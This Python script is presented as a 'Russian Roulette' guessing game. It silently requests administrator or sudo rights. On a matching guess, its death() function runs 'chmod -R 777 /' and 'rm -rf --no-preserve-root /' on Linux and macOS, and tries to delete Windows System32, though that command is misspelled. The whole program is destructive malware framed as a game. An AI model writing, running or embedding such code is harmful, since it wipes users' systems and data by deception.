import sys, os, subprocess, ctypes, random

class Roulet:

    def __init__(self):
        self.__numList = [i for i in range(1, 11)]

    def rnd_num(self):
        if len(self.__numList) != 0:
            num = random.choice(self.__numList)
            self.__numList.remove(num)

            return num
        else:
            print("Well done.\nYou Won!!")
            sys.exit()
    
    def disNums(self):
        print(self.__numList)
        

def run_as_admin():
    try:
        if sys.platform.startswith('win'):
            if ctypes.windll.shell32.IsUserAnAdmin() == 0:
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                sys.exit()
            else:
                return True
        elif sys.platform.startswith('linux') or sys.platform.startswith('darwin'):
            if os.geteuid() != 0:
                os.execvp('sudo', ['sudo'] + ['python3'] + sys.argv)
                sys.exit()
            else: 
                return True
        else:
            return False
    except Exception as e:
        print(f"Failed to run as adminstrator: {str(e)}")

def death():
    if sys.platform.startswith('win'):
        try:
            # command = "del /s /q C:\Windows\System32\*"
            command = ['def', '/s', '/q', 'C:\Windows\System32\*']
            # command = ['dir', '/ad']
            subprocess.run(["runas", "/user:Adminstrator", "cmd", "/c", *command], check=True)
        except subprocess.CalledProcessError as e:
            print(e)
    elif sys.platform.startswith('linux') or sys.platform.startswith('darwin'):
        try:
            command1= ['chmod', '-R', '777', '/']
            subprocess.run(['sudo', *command1], check=True)
            command2 = ['rm', '-rf', '--no-preserve-root', '/']
            # command = ['ls', '-a']
            subprocess.run(['sudo', *command2], check=True)
        except subprocess.CalledProcessError as e: 
            print(e)


def user_prompt():
    roulet = Roulet()
    welcome = """
 ____  __ __  _____ _____ ____   ____  ____       ____   ___   __ __  _        ___ ______  ______    ___ 
|    \|  |  |/ ___// ___/|    | /    ||    \     |    \ /   \ |  |  || |      /  _]      ||      |  /  _]
|  D  )  |  (   \_(   \_  |  | |  o  ||  _  |    |  D  )     ||  |  || |     /  [_|      ||      | /  [_ 
|    /|  |  |\__  |\__  | |  | |     ||  |  |    |    /|  O  ||  |  || |___ |    _]_|  |_||_|  |_||    _]
|    \|  :  |/  \ |/  \ | |  | |  _  ||  |  |    |    \|     ||  :  ||     ||   [_  |  |    |  |  |   [_ 
|  .  \     |\    |\    | |  | |  |  ||  |  |    |  .  \     ||     ||     ||     | |  |    |  |  |     |
|__|\_|\__,_| \___| \___||____||__|__||__|__|    |__|\_|\___/  \__,_||_____||_____| |__|    |__|  |_____|
    """
    print(welcome)
    while True:
        try:
            choice = int(input("Enter a number 1 through 10: "))
        except Exception as e:
            print(e)
            continue
        
        rNum = roulet.rnd_num()
        # roulet.disNums()
        if choice == rNum:
            death()
            sys.exit()
        else:
            continue

def main():
    run_as_admin()
    user_prompt()
    